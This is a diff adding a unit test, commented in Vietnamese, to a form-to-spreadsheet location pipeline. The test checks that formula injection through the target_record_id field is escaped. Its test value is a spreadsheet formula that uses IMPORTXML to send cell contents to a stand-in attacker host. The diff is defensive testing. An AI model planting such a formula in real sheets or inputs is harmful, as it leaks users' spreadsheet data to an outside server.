@@ -124,6 +124,19 @@ test('sanitizes spreadsheet formula injection for user-controlled values only', 
     assert.equal(record.status, pipeline.STATUSES.blocked);
 });
 
+test('vô hiệu hoá công thức nhập qua target_record_id và record_id kế thừa từ nó', () => {
+    // `target_record_id` là ô nhập tự do trong Form; `recordId = submission.targetRecordId || ...`
+    // nên công thức đi thẳng vào cột record_id của Location_Staging rồi sang Published_Locations.
+    const formula = '=IMPORTXML("https://evil.example/?d="&A1,"//a")';
+    const record = stage(submission({ requestId: 'REQ_FORMULA_TARGET', targetRecordId: formula }));
+    assert.equal(record.record_id, `'${formula}`);
+    assert.equal(record.target_record_id, `'${formula}`);
+
+    // Ca dương: record_id do pipeline sinh ra không bao giờ bị thêm dấu nháy oan.
+    const normal = stage(submission({ requestId: 'REQ_PLAIN' }));
+    assert.doesNotMatch(normal.record_id, /^'/);
+});
+
 test('classifies Maps coordinate conditions without losing the original URL', () => {
     assert.equal(pipeline.classifyCoordinateStatus({ mapsUrl: 'https://maps.google.com/?q=21.32,105.36' }).status, pipeline.COORDINATE_STATUSES.extracted);
     assert.equal(pipeline.classifyCoordinateStatus({ mapsUrl: 'https://maps.google.com/place/no-coordinate' }).status, pipeline.COORDINATE_STATUSES.needsReview);
